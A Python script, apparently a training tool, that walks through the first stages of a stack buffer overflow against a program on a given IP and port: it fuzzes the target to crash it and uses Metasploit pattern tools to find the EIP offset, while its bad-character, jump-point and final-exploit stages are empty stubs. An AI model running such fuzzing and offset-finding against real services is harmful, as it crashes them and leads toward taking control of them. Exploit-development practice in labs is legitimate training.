#!/bin/python

# Acarine v0.2
# Usage: 
    # Acarine.py -t [IP] -p [PORT]
# Description:
    # Acarine is a Buffer Overflow utility.
    # It is to be used in conjunction with Immunity Debugger and Immunity's Mona module.
## Dependencies:
    # Metasploit Framework Tools
## Unfinished features in development:
    # [3] Finding Bad Characters
    # [4] Finding the Jump Point
    # [5] Final Buffer Overflow Exploit
    # Count functionality
## Pending Fixes:
    # Error message to be added if incorrect args entered in terminal.

import argparse
import socket
import subprocess
import sys

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

def bufferSend(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        print("\nSending payload...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("\nExecution successful!\n")
        return 0
    except:
        print("Error: Could not connect.\n")
        return 1

def menu():
    print(f"""\nPlease choose an option from the Menu::
    [{color.DARKCYAN}1{color.END}] Is a Buffer Overflow Possible?
    [{color.DARKCYAN}2{color.END}] Finding EIP and Offset
    [{color.DARKCYAN}3{color.END}] Finding Bad Characters
    [{color.DARKCYAN}4{color.END}] Finding the Jump Point
    [{color.DARKCYAN}5{color.END}] Final Buffer Overflow Exploit
Other Options:    
    [{color.DARKCYAN}C{color.END}] Pre-Testing Checklist\n""")
    
    if count == 0:
        print(f"To return to menu at any point type '{color.DARKCYAN}menu{color.END}'.\n")
        menuInput = input(f"{color.GREEN}[ENTER] to start from [1], OR enter option: {color.END}")
    else:
        menuInput = input(f"{color.GREEN}Enter option: {color.END}")

    if menuInput == "C" or menuInput == "c":
        checklist()
    elif menuInput == "1" or menuInput == "":
        initialTest()
    elif menuInput == "2":
        offsetTest()
    elif menuInput == "3":
        badCharsTest()
    elif menuInput == "4":    
        jumpPointTest()
    elif menuInput == "5":
        exploitBuffer()
    else:
        print(f"\n{color.RED}Please enter a valid option!{color.END}")
        menu()

# [1] Is a Buffer Overflow Possible?:

def initialTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[1] Finding the EIP and Offset:{color.END}\n
This initial test is to determine whether a buffer overflow is possible, by making 
sure we can overwrite the EIP.\n
The next step will send 5000 'A' characters to the target ('41' in hex).
Upon execution, make sure to check the value of the EIP in Immunity (which should 
be '41414141' if successful)\n
Make sure the program you are testing is now LOADED and RUNNING in Immunity.\n""")
    aCharsInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
    if aCharsInput == "menu":
        menu()
    elif aCharsInput == "":
        aChars = 5000*"A"
    elif aCharsInput != "":
        try:
            aChars = int(aCharsInput)*"A"
        except:
            print(f"{color.RED}\nInput must be an Integer! Reloading section!{color.END}")
            initialTest()
    # print(aChars)    
    # bufferSend(aChars)
    
    if bufferSend(aChars) == 0:
        print(f"""The program should now have crashed and the EIP should read '41414141'.\n
Now we will move on to the finding the EIP and Offset.\n""")
        offsetTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        initialTest()

# [2] Finding the EIP and Offset:

def offsetTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[2] Finding the EIP and Offset:{color.END}\n
This section is to find the exact location of the EIP and its offset.\n
To do this we will be sending a pattern of 5000 characters, where upon noting what numbers appear in the EIP
we can then find the exact offset.\n
Make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
    patternInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
    if patternInput == "menu":
        menu()
    elif patternInput == "":
        pattern = 5000
    elif patternInput != "":
        try:
            pattern = int(patternInput)
        except:
            print(f"{color.RED}\nInput must be an Integer! Reloading section!{color.END}")
            offsetTest()
    patternC = subprocess.run(['msf-pattern_create','-l', str(pattern)], capture_output=True, text=True)
    # print(patternC.stdout)
    # bufferSend(patternC.stdout)
    if bufferSend(patternC.stdout) == 0:
        try:
            EIP = int(input(f"{color.GREEN}Enter the value of the EIP: {color.END}"))
        except:
            print(f"{color.RED}\nEIP must be an Integer! Reloading section!{color.END}")
            offsetTest()
        if len(str(EIP)) == 8:
            True
        else:
            print(f"{color.RED}\nEIP must be 8 characters long! Reloading section!{color.END}")
            offsetTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        offsetTest()
    patternO = subprocess.run(['msf-pattern_offset','-l', str(pattern),'-q', str(EIP)], capture_output=True, text=True)
    patternOffsetOutput = patternO.stdout
    print(f"\n{patternOffsetOutput}")
    global offset
    offset = int(patternOffsetOutput[26:])
    # print(offset)
    print(f"""Now we need to test whether we are on target and have indeed successfully discovered the offset.\n
We will now send a payload of Four 'B' characters ('42424242' in hex) with our offset of {offset}.
If we are successful the EIP will read '42424242' as these 'B' should land exactly.\n
Again, make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
    BTest = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
    if BTest == "menu":
        menu()
    else:
        True
    offsetLoad = "A" * offset + "B" * 4
    # bufferSend(offsetLoad)
    if bufferSend(offsetLoad) == 0:
        print(f"""The program should now have crashed and the EIP should read '42424242'.\n
This means we are on target and now we will move on to the finding Bad Characters.\n""")
        badCharsTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        offsetTest()
    
# [3] Finding Bad Characters:

def badCharsTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[3] Finding Bad Characters:{color.END}\n""")
    # If Offset not already found from [2] then ask user to enter.
    # Character generation:
    # for x in range(1,256):
    #     print("\\x" + "{:02x}".format(x), end="")
    # print()
    sys.exit()

# [4] Finding the Jump Point:

def jumpPointTest():
    print("Jump Point Test")
    sys.exit()

# [5] Final Buffer Overflow Exploit

def exploitBuffer():
    print("Exploit")
    sys.exit()

def checklist():
    print(f"""\nRecommended pre-testing checklist:
    [*] Run Immunity as Admininistrator
    [*] Set Immunity's working directory [{color.BOLD}{color.YELLOW}!mona config -set workingfolder c:\mona\%p{color.END}]
    [*] Load and Run the vulnerable program in Immunity
    [*] Disable Windows Security\n""")

parser = argparse.ArgumentParser()
parser.add_argument('-t','-T','--target',help="target IP")#,default=socket.gethostname())
parser.add_argument('-p','-P','--port', help="target PORT", type=int)
args = parser.parse_args()

HOST = args.target
PORT = args.port

# def argChecker(HOST,PORT):
#     if HOST and/or PORT is "None" then throw "-h" error.

print(f"""{color.BOLD}{color.UNDERLINE}\nWelcome to Acarine!\n{color.END}
This program is a {color.BOLD}Buffer Overflow{color.END} utility. 
To be used in conjunction with {color.BOLD}Immunity Debugger{color.END} and the Immunity's {color.BOLD}Mona module{color.END}.\n
Target is @ {color.BOLD}{color.DARKCYAN}{HOST}:{PORT}{color.END}""")
count = 0
menu()
